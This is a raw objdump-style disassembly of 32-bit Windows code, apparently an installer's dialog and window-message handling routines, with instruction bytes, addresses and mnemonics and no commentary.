  403ac3:	3b cf                	cmp    %edi,%ecx
  403ac5:	7c 3e                	jl     0x403b05
  403ac7:	83 f8 01             	cmp    $0x1,%eax
  403aca:	75 31                	jne    0x403afd
  403acc:	57                   	push   %edi
  403acd:	ff 76 10             	push   0x10(%esi)
  403ad0:	e8 98 d8 ff ff       	call   0x40136d
  403ad5:	85 c0                	test   %eax,%eax
  403ad7:	74 24                	je     0x403afd
  403ad9:	6a 01                	push   $0x1
  403adb:	57                   	push   %edi
  403adc:	68 0f 04 00 00       	push   $0x40f
  403ae1:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403ae7:	ff 15 38 72 40 00    	call   *0x407238
  403aed:	33 c0                	xor    %eax,%eax
  403aef:	39 3d ec e7 42 00    	cmp    %edi,0x42e7ec
  403af5:	0f 94 c0             	sete   %al
  403af8:	e9 81 02 00 00       	jmp    0x403d7e
  403afd:	39 3e                	cmp    %edi,(%esi)
  403aff:	0f 84 77 02 00 00    	je     0x403d7c
  403b05:	68 0b 04 00 00       	push   $0x40b
  403b0a:	e8 ec 02 00 00       	call   0x403dfb
  403b0f:	a1 6c a4 42 00       	mov    0x42a46c,%eax
  403b14:	01 05 74 92 40 00    	add    %eax,0x409274
  403b1a:	c1 e0 06             	shl    $0x6,%eax
  403b1d:	03 f0                	add    %eax,%esi
  403b1f:	a1 74 92 40 00       	mov    0x409274,%eax
  403b24:	3b 05 44 f0 42 00    	cmp    0x42f044,%eax
  403b2a:	75 07                	jne    0x403b33
  403b2c:	6a 01                	push   $0x1
  403b2e:	e8 dd d8 ff ff       	call   0x401410
  403b33:	83 3d ec e7 42 00 00 	cmpl   $0x0,0x42e7ec
  403b3a:	0f 85 f7 01 00 00    	jne    0x403d37
  403b40:	a1 44 f0 42 00       	mov    0x42f044,%eax
  403b45:	39 05 74 92 40 00    	cmp    %eax,0x409274
  403b4b:	0f 83 e6 01 00 00    	jae    0x403d37
  403b51:	ff 76 24             	push   0x24(%esi)
  403b54:	8b 7e 14             	mov    0x14(%esi),%edi
  403b57:	68 00 70 43 00       	push   $0x437000
  403b5c:	e8 65 1e 00 00       	call   0x4059c6
  403b61:	ff 76 20             	push   0x20(%esi)
  403b64:	68 19 fc ff ff       	push   $0xfffffc19
  403b69:	53                   	push   %ebx
  403b6a:	e8 40 02 00 00       	call   0x403daf
  403b6f:	ff 76 1c             	push   0x1c(%esi)
  403b72:	68 1b fc ff ff       	push   $0xfffffc1b
  403b77:	53                   	push   %ebx
  403b78:	e8 32 02 00 00       	call   0x403daf
  403b7d:	ff 76 28             	push   0x28(%esi)
  403b80:	68 1a fc ff ff       	push   $0xfffffc1a
  403b85:	53                   	push   %ebx
  403b86:	e8 24 02 00 00       	call   0x403daf
  403b8b:	6a 03                	push   $0x3
  403b8d:	53                   	push   %ebx
  403b8e:	ff 15 20 72 40 00    	call   *0x407220
  403b94:	83 3d ac f0 42 00 00 	cmpl   $0x0,0x42f0ac
  403b9b:	8b e8                	mov    %eax,%ebp
  403b9d:	74 08                	je     0x403ba7
  403b9f:	66 81 e7 fd fe       	and    $0xfefd,%di
  403ba4:	83 cf 04             	or     $0x4,%edi
  403ba7:	8b c7                	mov    %edi,%eax
  403ba9:	83 e0 08             	and    $0x8,%eax
  403bac:	50                   	push   %eax
  403bad:	55                   	push   %ebp
  403bae:	ff 15 f4 71 40 00    	call   *0x4071f4
  403bb4:	8b c7                	mov    %edi,%eax
  403bb6:	25 00 01 00 00       	and    $0x100,%eax
  403bbb:	50                   	push   %eax
  403bbc:	55                   	push   %ebp
  403bbd:	ff 15 30 72 40 00    	call   *0x407230
  403bc3:	8b c7                	mov    %edi,%eax
  403bc5:	83 e0 02             	and    $0x2,%eax
  403bc8:	50                   	push   %eax
  403bc9:	e8 03 02 00 00       	call   0x403dd1
  403bce:	83 e7 04             	and    $0x4,%edi
  403bd1:	57                   	push   %edi
  403bd2:	ff 35 48 94 42 00    	push   0x429448
  403bd8:	ff 15 30 72 40 00    	call   *0x407230
  403bde:	33 ff                	xor    %edi,%edi
  403be0:	6a 01                	push   $0x1
  403be2:	57                   	push   %edi
  403be3:	68 f4 00 00 00       	push   $0xf4
  403be8:	55                   	push   %ebp
  403be9:	8b 2d 38 72 40 00    	mov    0x407238,%ebp
  403bef:	ff d5                	call   *%ebp
  403bf1:	39 3d ac f0 42 00    	cmp    %edi,0x42f0ac
  403bf7:	74 13                	je     0x403c0c
  403bf9:	57                   	push   %edi
  403bfa:	6a 02                	push   $0x2
  403bfc:	68 01 04 00 00       	push   $0x401
  403c01:	53                   	push   %ebx
  403c02:	ff d5                	call   *%ebp
  403c04:	ff 35 48 94 42 00    	push   0x429448
  403c0a:	eb 06                	jmp    0x403c12
  403c0c:	ff 35 80 a4 42 00    	push   0x42a480
  403c12:	e8 cd 01 00 00       	call   0x403de4
  403c17:	bd 88 a4 42 00       	mov    $0x42a488,%ebp
  403c1c:	68 20 e8 42 00       	push   $0x42e820
  403c21:	55                   	push   %ebp
  403c22:	e8 7d 1d 00 00       	call   0x4059a4
  403c27:	ff 76 18             	push   0x18(%esi)
  403c2a:	55                   	push   %ebp
  403c2b:	e8 8a 1d 00 00       	call   0x4059ba
  403c30:	03 c5                	add    %ebp,%eax
  403c32:	50                   	push   %eax
  403c33:	e8 8e 1d 00 00       	call   0x4059c6
  403c38:	55                   	push   %ebp
  403c39:	53                   	push   %ebx
  403c3a:	ff 15 e8 71 40 00    	call   *0x4071e8
  403c40:	57                   	push   %edi
  403c41:	ff 76 08             	push   0x8(%esi)
  403c44:	e8 24 d7 ff ff       	call   0x40136d
  403c49:	85 c0                	test   %eax,%eax
  403c4b:	0f 85 be fe ff ff    	jne    0x403b0f
  403c51:	39 06                	cmp    %eax,(%esi)
  403c53:	0f 84 b6 fe ff ff    	je     0x403b0f
  403c59:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  403c5d:	75 1d                	jne    0x403c7c
  403c5f:	39 05 ac f0 42 00    	cmp    %eax,0x42f0ac
  403c65:	0f 85 11 01 00 00    	jne    0x403d7c
  403c6b:	39 05 a0 f0 42 00    	cmp    %eax,0x42f0a0
  403c71:	0f 85 98 fe ff ff    	jne    0x403b0f
  403c77:	e9 00 01 00 00       	jmp    0x403d7c
  403c7c:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403c82:	ff 15 e0 71 40 00    	call   *0x4071e0
  403c88:	89 35 58 9c 42 00    	mov    %esi,0x429c58
  403c8e:	83 3e 00             	cmpl   $0x0,(%esi)
  403c91:	0f 8e c0 00 00 00    	jle    0x403d57
  403c97:	8b 46 04             	mov    0x4(%esi),%eax
  403c9a:	56                   	push   %esi
  403c9b:	ff 34 85 78 92 40 00 	push   0x409278(,%eax,4)
  403ca2:	66 8b 06             	mov    (%esi),%ax
  403ca5:	66 03 05 00 e8 42 00 	add    0x42e800,%ax
  403cac:	53                   	push   %ebx
  403cad:	0f b7 c0             	movzwl %ax,%eax
  403cb0:	50                   	push   %eax
  403cb1:	ff 35 20 f0 42 00    	push   0x42f020
  403cb7:	ff 15 dc 71 40 00    	call   *0x4071dc
  403cbd:	85 c0                	test   %eax,%eax
  403cbf:	a3 f8 e7 42 00       	mov    %eax,0x42e7f8
  403cc4:	0f 84 8d 00 00 00    	je     0x403d57
  403cca:	ff 76 2c             	push   0x2c(%esi)
  403ccd:	6a 06                	push   $0x6
  403ccf:	50                   	push   %eax
  403cd0:	e8 da 00 00 00       	call   0x403daf
  403cd5:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cd9:	50                   	push   %eax
  403cda:	68 fa 03 00 00       	push   $0x3fa
  403cdf:	53                   	push   %ebx
  403ce0:	ff 15 20 72 40 00    	call   *0x407220
  403ce6:	50                   	push   %eax
  403ce7:	ff 15 70 71 40 00    	call   *0x407170
  403ced:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cf1:	50                   	push   %eax
  403cf2:	53                   	push   %ebx
  403cf3:	ff 15 6c 71 40 00    	call   *0x40716c
  403cf9:	33 ff                	xor    %edi,%edi
  403cfb:	6a 15                	push   $0x15
  403cfd:	57                   	push   %edi
  403cfe:	57                   	push   %edi
  403cff:	ff 74 24 20          	push   0x20(%esp)
  403d03:	ff 74 24 20          	push   0x20(%esp)
  403d07:	57                   	push   %edi
  403d08:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403d0e:	ff 15 7c 71 40 00    	call   *0x40717c
  403d14:	57                   	push   %edi
  403d15:	ff 76 0c             	push   0xc(%esi)
  403d18:	e8 50 d6 ff ff       	call   0x40136d
  403d1d:	6a 08                	push   $0x8
  403d1f:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403d25:	ff 15 f4 71 40 00    	call   *0x4071f4
  403d2b:	68 05 04 00 00       	push   $0x405
  403d30:	e8 c6 00 00 00       	call   0x403dfb
  403d35:	eb 20                	jmp    0x403d57
  403d37:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403d3d:	ff 15 e0 71 40 00    	call   *0x4071e0
  403d43:	ff 35 50 98 42 00    	push   0x429850
  403d49:	83 25 24 f0 42 00 00 	andl   $0x0,0x42f024
  403d50:	53                   	push   %ebx
  403d51:	ff 15 68 71 40 00    	call   *0x407168
  403d57:	83 3d 88 b4 42 00 00 	cmpl   $0x0,0x42b488
  403d5e:	75 1c                	jne    0x403d7c
  403d60:	83 3d f8 e7 42 00 00 	cmpl   $0x0,0x42e7f8
  403d67:	74 13                	je     0x403d7c
  403d69:	6a 0a                	push   $0xa
  403d6b:	53                   	push   %ebx
  403d6c:	ff 15 f4 71 40 00    	call   *0x4071f4
  403d72:	c7 05 88 b4 42 00 01 	movl   $0x1,0x42b488
  403d79:	00 00 00 
  403d7c:	33 c0                	xor    %eax,%eax
  403d7e:	5f                   	pop    %edi
  403d7f:	5e                   	pop    %esi
  403d80:	5d                   	pop    %ebp
  403d81:	5b                   	pop    %ebx
  403d82:	83 c4 10             	add    $0x10,%esp
  403d85:	c2 10 00             	ret    $0x10
  403d88:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403d8d:	75 06                	jne    0x403d95
  403d8f:	ff 05 ec e7 42 00    	incl   0x42e7ec
  403d95:	6a 00                	push   $0x0
  403d97:	ff 74 24 08          	push   0x8(%esp)
  403d9b:	68 08 04 00 00       	push   $0x408
  403da0:	ff 35 24 f0 42 00    	push   0x42f024
  403da6:	ff 15 38 72 40 00    	call   *0x407238
  403dac:	c2 04 00             	ret    $0x4
  403daf:	ff 74 24 0c          	push   0xc(%esp)
  403db3:	6a 00                	push   $0x0
  403db5:	e8 0c 1c 00 00       	call   0x4059c6
  403dba:	50                   	push   %eax
  403dbb:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403dbf:	05 e8 03 00 00       	add    $0x3e8,%eax
  403dc4:	50                   	push   %eax
  403dc5:	ff 74 24 0c          	push   0xc(%esp)
  403dc9:	e8 aa 14 00 00       	call   0x405278
  403dce:	c2 0c 00             	ret    $0xc
  403dd1:	ff 74 24 04          	push   0x4(%esp)
  403dd5:	ff 35 80 a4 42 00    	push   0x42a480
  403ddb:	ff 15 30 72 40 00    	call   *0x407230
  403de1:	c2 04 00             	ret    $0x4
  403de4:	6a 01                	push   $0x1
  403de6:	ff 74 24 08          	push   0x8(%esp)
  403dea:	6a 28                	push   $0x28
  403dec:	ff 35 24 f0 42 00    	push   0x42f024
  403df2:	ff 15 38 72 40 00    	call   *0x407238
  403df8:	c2 04 00             	ret    $0x4
  403dfb:	a1 f8 e7 42 00       	mov    0x42e7f8,%eax
  403e00:	85 c0                	test   %eax,%eax
  403e02:	74 0f                	je     0x403e13
  403e04:	6a 00                	push   $0x0
  403e06:	6a 00                	push   $0x0
  403e08:	ff 74 24 0c          	push   0xc(%esp)
  403e0c:	50                   	push   %eax
  403e0d:	ff 15 38 72 40 00    	call   *0x407238
  403e13:	c2 04 00             	ret    $0x4
  403e16:	55                   	push   %ebp
  403e17:	8b ec                	mov    %esp,%ebp
  403e19:	83 ec 0c             	sub    $0xc,%esp
  403e1c:	8b 45 08             	mov    0x8(%ebp),%eax
  403e1f:	56                   	push   %esi
  403e20:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403e25:	83 f8 05             	cmp    $0x5,%eax
  403e28:	0f 87 8e 00 00 00    	ja     0x403ebc
  403e2e:	6a eb                	push   $0xffffffeb
  403e30:	ff 75 10             	push   0x10(%ebp)
  403e33:	ff 15 84 71 40 00    	call   *0x407184
  403e39:	8b f0                	mov    %eax,%esi
  403e3b:	85 f6                	test   %esi,%esi
  403e3d:	74 7d                	je     0x403ebc
  403e3f:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403e43:	8b 06                	mov    (%esi),%eax
  403e45:	57                   	push   %edi
  403e46:	8b 3d 80 71 40 00    	mov    0x407180,%edi
  403e4c:	74 03                	je     0x403e51
  403e4e:	50                   	push   %eax
  403e4f:	ff d7                	call   *%edi
  403e51:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403e55:	74 0a                	je     0x403e61
  403e57:	50                   	push   %eax
  403e58:	ff 75 0c             	push   0xc(%ebp)
  403e5b:	ff 15 54 70 40 00    	call   *0x407054
  403e61:	ff 76 10             	push   0x10(%esi)
  403e64:	ff 75 0c             	push   0xc(%ebp)
  403e67:	ff 15 50 70 40 00    	call   *0x407050
  403e6d:	8b 46 04             	mov    0x4(%esi),%eax
  403e70:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  403e74:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e77:	74 06                	je     0x403e7f
  403e79:	50                   	push   %eax
  403e7a:	ff d7                	call   *%edi
  403e7c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e7f:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403e83:	5f                   	pop    %edi
  403e84:	74 0a                	je     0x403e90
  403e86:	50                   	push   %eax
  403e87:	ff 75 0c             	push   0xc(%ebp)
  403e8a:	ff 15 3c 70 40 00    	call   *0x40703c
  403e90:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  403e94:	74 21                	je     0x403eb7
  403e96:	8b 46 08             	mov    0x8(%esi),%eax
  403e99:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403e9c:	8b 46 0c             	mov    0xc(%esi),%eax
  403e9f:	85 c0                	test   %eax,%eax
  403ea1:	74 07                	je     0x403eaa
  403ea3:	50                   	push   %eax
  403ea4:	ff 15 44 70 40 00    	call   *0x407044
  403eaa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403ead:	50                   	push   %eax
  403eae:	ff 15 48 70 40 00    	call   *0x407048
  403eb4:	89 46 0c             	mov    %eax,0xc(%esi)
  403eb7:	8b 46 0c             	mov    0xc(%esi),%eax
  403eba:	eb 02                	jmp    0x403ebe
  403ebc:	33 c0                	xor    %eax,%eax
  403ebe:	5e                   	pop    %esi
  403ebf:	c9                   	leave
  403ec0:	c2 0c 00             	ret    $0xc
  403ec3:	55                   	push   %ebp
  403ec4:	8b ec                	mov    %esp,%ebp
  403ec6:	8b 45 08             	mov    0x8(%ebp),%eax
  403ec9:	8b 0d 4c 94 42 00    	mov    0x42944c,%ecx
  403ecf:	ff 75 10             	push   0x10(%ebp)
  403ed2:	03 c8                	add    %eax,%ecx
  403ed4:	51                   	push   %ecx
  403ed5:	ff 75 0c             	push   0xc(%ebp)
  403ed8:	ff 15 b8 70 40 00    	call   *0x4070b8
  403ede:	ff 75 0c             	push   0xc(%ebp)
  403ee1:	e8 d4 1a 00 00       	call   0x4059ba
  403ee6:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403ee9:	89 01                	mov    %eax,(%ecx)
  403eeb:	01 05 4c 94 42 00    	add    %eax,0x42944c
  403ef1:	33 c0                	xor    %eax,%eax
  403ef3:	5d                   	pop    %ebp
  403ef4:	c2 10 00             	ret    $0x10
  403ef7:	55                   	push   %ebp
  403ef8:	8b ec                	mov    %esp,%ebp
  403efa:	83 ec 0c             	sub    $0xc,%esp
  403efd:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403f04:	53                   	push   %ebx
  403f05:	56                   	push   %esi
  403f06:	57                   	push   %edi
  403f07:	0f 85 0d 01 00 00    	jne    0x40401a
  403f0d:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403f10:	8b 7b 30             	mov    0x30(%ebx),%edi
  403f13:	85 ff                	test   %edi,%edi
  403f15:	7d 11                	jge    0x403f28
  403f17:	8b 0d fc e7 42 00    	mov    0x42e7fc,%ecx
  403f1d:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  403f24:	2b c8                	sub    %eax,%ecx
  403f26:	8b 39                	mov    (%ecx),%edi
  403f28:	a1 58 f0 42 00       	mov    0x42f058,%eax
  403f2d:	ff 73 34             	push   0x34(%ebx)
  403f30:	03 f8                	add    %eax,%edi
  403f32:	6a 22                	push   $0x22
  403f34:	0f be 07             	movsbl (%edi),%eax
  403f37:	89 45 14             	mov    %eax,0x14(%ebp)
  403f3a:	8b 43 14             	mov    0x14(%ebx),%eax
  403f3d:	ff 75 08             	push   0x8(%ebp)
  403f40:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403f44:	8b f0                	mov    %eax,%esi
  403f46:	47                   	inc    %edi
  403f47:	f7 d6                	not    %esi
  403f49:	c1 ee 05             	shr    $0x5,%esi
  403f4c:	83 e6 01             	and    $0x1,%esi
  403f4f:	83 e0 01             	and    $0x1,%eax
  403f52:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403f55:	c7 45 fc c3 3e 40 00 	movl   $0x403ec3,-0x4(%ebp)
  403f5c:	0b f0                	or     %eax,%esi
  403f5e:	e8 4c fe ff ff       	call   0x403daf
  403f63:	ff 73 38             	push   0x38(%ebx)
  403f66:	6a 23                	push   $0x23
  403f68:	ff 75 08             	push   0x8(%ebp)
  403f6b:	e8 3f fe ff ff       	call   0x403daf
  403f70:	33 c0                	xor    %eax,%eax
  403f72:	6a 01                	push   $0x1
  403f74:	85 f6                	test   %esi,%esi
  403f76:	0f 94 c0             	sete   %al
  403f79:	05 0a 04 00 00       	add    $0x40a,%eax
  403f7e:	50                   	push   %eax
  403f7f:	ff 75 08             	push   0x8(%ebp)
  403f82:	ff 15 90 71 40 00    	call   *0x407190
  403f88:	56                   	push   %esi
  403f89:	e8 43 fe ff ff       	call   0x403dd1
  403f8e:	68 e8 03 00 00       	push   $0x3e8
  403f93:	ff 75 08             	push   0x8(%ebp)
  403f96:	ff 15 20 72 40 00    	call   *0x407220
  403f9c:	8b d8                	mov    %eax,%ebx
  403f9e:	53                   	push   %ebx
  403f9f:	e8 40 fe ff ff       	call   0x403de4
  403fa4:	8b 35 38 72 40 00    	mov    0x407238,%esi
  403faa:	6a 00                	push   $0x0
  403fac:	6a 01                	push   $0x1
  403fae:	68 5b 04 00 00       	push   $0x45b
  403fb3:	53                   	push   %ebx
  403fb4:	ff d6                	call   *%esi
  403fb6:	a1 28 f0 42 00       	mov    0x42f028,%eax
  403fbb:	8b 40 68             	mov    0x68(%eax),%eax
  403fbe:	85 c0                	test   %eax,%eax
  403fc0:	7d 09                	jge    0x403fcb
  403fc2:	f7 d8                	neg    %eax
  403fc4:	50                   	push   %eax
  403fc5:	ff 15 80 71 40 00    	call   *0x407180
  403fcb:	50                   	push   %eax
  403fcc:	6a 00                	push   $0x0
  403fce:	68 43 04 00 00       	push   $0x443
  403fd3:	53                   	push   %ebx
  403fd4:	ff d6                	call   *%esi
  403fd6:	68 00 00 01 04       	push   $0x4010000
  403fdb:	6a 00                	push   $0x0
  403fdd:	68 45 04 00 00       	push   $0x445
  403fe2:	53                   	push   %ebx
  403fe3:	ff d6                	call   *%esi
  403fe5:	83 25 4c 94 42 00 00 	andl   $0x0,0x42944c
  403fec:	57                   	push   %edi
  403fed:	e8 c8 19 00 00       	call   0x4059ba
  403ff2:	50                   	push   %eax
  403ff3:	6a 00                	push   $0x0
  403ff5:	68 35 04 00 00       	push   $0x435
  403ffa:	53                   	push   %ebx
  403ffb:	ff d6                	call   *%esi
  403ffd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404000:	50                   	push   %eax
  404001:	ff 75 14             	push   0x14(%ebp)
  404004:	68 49 04 00 00       	push   $0x449
  404009:	53                   	push   %ebx
  40400a:	ff d6                	call   *%esi
  40400c:	83 25 68 a4 42 00 00 	andl   $0x0,0x42a468
  404013:	33 c0                	xor    %eax,%eax
  404015:	e9 61 01 00 00       	jmp    0x40417b
  40401a:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404021:	8b 1d 20 72 40 00    	mov    0x407220,%ebx
  404027:	8b 35 38 72 40 00    	mov    0x407238,%esi
  40402d:	75 5a                	jne    0x404089
  40402f:	8b 45 10             	mov    0x10(%ebp),%eax
  404032:	c1 e8 10             	shr    $0x10,%eax
  404035:	66 85 c0             	test   %ax,%ax
  404038:	0f 85 2e 01 00 00    	jne    0x40416c
  40403e:	33 c0                	xor    %eax,%eax
  404040:	39 05 68 a4 42 00    	cmp    %eax,0x42a468
  404046:	0f 85 20 01 00 00    	jne    0x40416c
  40404c:	8b 0d 58 9c 42 00    	mov    0x429c58,%ecx
  404052:	8d 79 14             	lea    0x14(%ecx),%edi
  404055:	f6 07 20             	testb  $0x20,(%edi)
  404058:	0f 84 0e 01 00 00    	je     0x40416c
  40405e:	50                   	push   %eax
  40405f:	50                   	push   %eax
  404060:	68 f0 00 00 00       	push   $0xf0
  404065:	68 0a 04 00 00       	push   $0x40a
  40406a:	ff 75 08             	push   0x8(%ebp)
  40406d:	ff d3                	call   *%ebx
  40406f:	50                   	push   %eax
  404070:	ff d6                	call   *%esi
  404072:	8b 0f                	mov    (%edi),%ecx
  404074:	83 e0 01             	and    $0x1,%eax
  404077:	83 e1 fe             	and    $0xfffffffe,%ecx
  40407a:	50                   	push   %eax
  40407b:	0b c8                	or     %eax,%ecx
  40407d:	89 0f                	mov    %ecx,(%edi)
  40407f:	e8 4d fd ff ff       	call   0x403dd1
  404084:	e8 f9 00 00 00       	call   0x404182
  404089:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40408d:	0f 85 ca 00 00 00    	jne    0x40415d
  404093:	68 e8 03 00 00       	push   $0x3e8
  404098:	ff 75 08             	push   0x8(%ebp)
  40409b:	ff d3                	call   *%ebx
  40409d:	8b 7d 14             	mov    0x14(%ebp),%edi
  4040a0:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4040a7:	75 72                	jne    0x40411b
  4040a9:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4040b0:	75 69                	jne    0x40411b
  4040b2:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4040b5:	8b 57 18             	mov    0x18(%edi),%edx
  4040b8:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4040bb:	2b ca                	sub    %edx,%ecx
  4040bd:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4040c3:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4040c6:	c7 45 fc c0 df 42 00 	movl   $0x42dfc0,-0x4(%ebp)
  4040cd:	73 4c                	jae    0x40411b
  4040cf:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4040d2:	51                   	push   %ecx
  4040d3:	6a 00                	push   $0x0
  4040d5:	68 4b 04 00 00       	push   $0x44b
  4040da:	50                   	push   %eax
  4040db:	ff d6                	call   *%esi
  4040dd:	8b 3d 8c 71 40 00    	mov    0x40718c,%edi
  4040e3:	68 02 7f 00 00       	push   $0x7f02
  4040e8:	6a 00                	push   $0x0
  4040ea:	ff d7                	call   *%edi
  4040ec:	8b 1d 88 71 40 00    	mov    0x407188,%ebx
  4040f2:	50                   	push   %eax
  4040f3:	ff d3                	call   *%ebx
  4040f5:	6a 01                	push   $0x1
  4040f7:	6a 00                	push   $0x0
  4040f9:	6a 00                	push   $0x0
  4040fb:	ff 75 fc             	push   -0x4(%ebp)
  4040fe:	68 c4 92 40 00       	push   $0x4092c4
  404103:	ff 75 08             	push   0x8(%ebp)
  404106:	ff 15 58 71 40 00    	call   *0x407158
  40410c:	68 00 7f 00 00       	push   $0x7f00
  404111:	6a 00                	push   $0x0
  404113:	ff d7                	call   *%edi
  404115:	50                   	push   %eax
  404116:	ff d3                	call   *%ebx
  404118:	8b 7d 14             	mov    0x14(%ebp),%edi
  40411b:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404122:	75 4b                	jne    0x40416f
  404124:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  40412b:	75 42                	jne    0x40416f
  40412d:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404131:	75 11                	jne    0x404144
  404133:	6a 00                	push   $0x0
  404135:	6a 01                	push   $0x1
  404137:	68 11 01 00 00       	push   $0x111
  40413c:	ff 35 24 f0 42 00    	push   0x42f024
  404142:	ff d6                	call   *%esi
  404144:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404148:	75 0e                	jne    0x404158
  40414a:	6a 00                	push   $0x0
  40414c:	6a 00                	push   $0x0
  40414e:	6a 10                	push   $0x10
  404150:	ff 35 24 f0 42 00    	push   0x42f024
  404156:	ff d6                	call   *%esi
  404158:	33 c0                	xor    %eax,%eax
  40415a:	40                   	inc    %eax
  40415b:	eb 1e                	jmp    0x40417b
  40415d:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404164:	75 06                	jne    0x40416c
  404166:	ff 05 68 a4 42 00    	incl   0x42a468
  40416c:	8b 7d 14             	mov    0x14(%ebp),%edi
  40416f:	57                   	push   %edi
  404170:	ff 75 10             	push   0x10(%ebp)
  404173:	ff 75 0c             	push   0xc(%ebp)
  404176:	e8 9b fc ff ff       	call   0x403e16
  40417b:	5f                   	pop    %edi
  40417c:	5e                   	pop    %esi
  40417d:	5b                   	pop    %ebx
  40417e:	c9                   	leave
  40417f:	c2 10 00             	ret    $0x10
  404182:	83 3d ac f0 42 00 00 	cmpl   $0x0,0x42f0ac
  404189:	a1 48 94 42 00       	mov    0x429448,%eax
  40418e:	75 05                	jne    0x404195
  404190:	a1 80 a4 42 00       	mov    0x42a480,%eax
  404195:	6a 01                	push   $0x1
  404197:	6a 01                	push   $0x1
  404199:	68 f4 00 00 00       	push   $0xf4
  40419e:	50                   	push   %eax
  40419f:	ff 15 38 72 40 00    	call   *0x407238
  4041a5:	c3                   	ret
  4041a6:	55                   	push   %ebp
  4041a7:	8b ec                	mov    %esp,%ebp
  4041a9:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4041b0:	56                   	push   %esi
  4041b1:	8b 75 14             	mov    0x14(%ebp),%esi
  4041b4:	75 26                	jne    0x4041dc
  4041b6:	ff 76 30             	push   0x30(%esi)
  4041b9:	6a 1d                	push   $0x1d
  4041bb:	ff 75 08             	push   0x8(%ebp)
  4041be:	e8 ec fb ff ff       	call   0x403daf
  4041c3:	8b 46 3c             	mov    0x3c(%esi),%eax
  4041c6:	c1 e0 0a             	shl    $0xa,%eax
  4041c9:	05 00 00 43 00       	add    $0x430000,%eax
  4041ce:	50                   	push   %eax
  4041cf:	68 e8 03 00 00       	push   $0x3e8
  4041d4:	ff 75 08             	push   0x8(%ebp)
  4041d7:	e8 9c 10 00 00       	call   0x405278
  4041dc:	56                   	push   %esi
  4041dd:	ff 75 10             	push   0x10(%ebp)
  4041e0:	ff 75 0c             	push   0xc(%ebp)
  4041e3:	e8 2e fc ff ff       	call   0x403e16
  4041e8:	5e                   	pop    %esi
  4041e9:	5d                   	pop    %ebp
  4041ea:	c2 10 00             	ret    $0x10
  4041ed:	55                   	push   %ebp
  4041ee:	8b ec                	mov    %esp,%ebp
  4041f0:	83 ec 48             	sub    $0x48,%esp
  4041f3:	a1 58 9c 42 00       	mov    0x429c58,%eax
  4041f8:	53                   	push   %ebx
  4041f9:	56                   	push   %esi
  4041fa:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4041fd:	8b 70 3c             	mov    0x3c(%eax),%esi
  404200:	8b 40 38             	mov    0x38(%eax),%eax
  404203:	c1 e6 0a             	shl    $0xa,%esi
  404206:	81 c6 00 00 43 00    	add    $0x430000,%esi
  40420c:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404213:	57                   	push   %edi
  404214:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404217:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  40421c:	75 0d                	jne    0x40422b
  40421e:	56                   	push   %esi
  40421f:	53                   	push   %ebx
  404220:	e8 59 10 00 00       	call   0x40527e
  404225:	56                   	push   %esi
  404226:	e8 a8 19 00 00       	call   0x405bd3
  40422b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404232:	75 78                	jne    0x4042ac
  404234:	53                   	push   %ebx
  404235:	ff 75 08             	push   0x8(%ebp)
  404238:	ff 15 20 72 40 00    	call   *0x407220
  40423e:	56                   	push   %esi
  40423f:	8b f8                	mov    %eax,%edi
  404241:	e8 c3 12 00 00       	call   0x405509
  404246:	85 c0                	test   %eax,%eax
  404248:	74 10                	je     0x40425a
  40424a:	56                   	push   %esi
  40424b:	e8 e0 12 00 00       	call   0x405530
  404250:	85 c0                	test   %eax,%eax
  404252:	75 06                	jne    0x40425a
  404254:	56                   	push   %esi
  404255:	e8 43 12 00 00       	call   0x40549d
  40425a:	8b 45 08             	mov    0x8(%ebp),%eax
  40425d:	56                   	push   %esi
  40425e:	57                   	push   %edi
  40425f:	a3 f8 e7 42 00       	mov    %eax,0x42e7f8
  404264:	ff 15 e8 71 40 00    	call   *0x4071e8
  40426a:	8b 45 14             	mov    0x14(%ebp),%eax
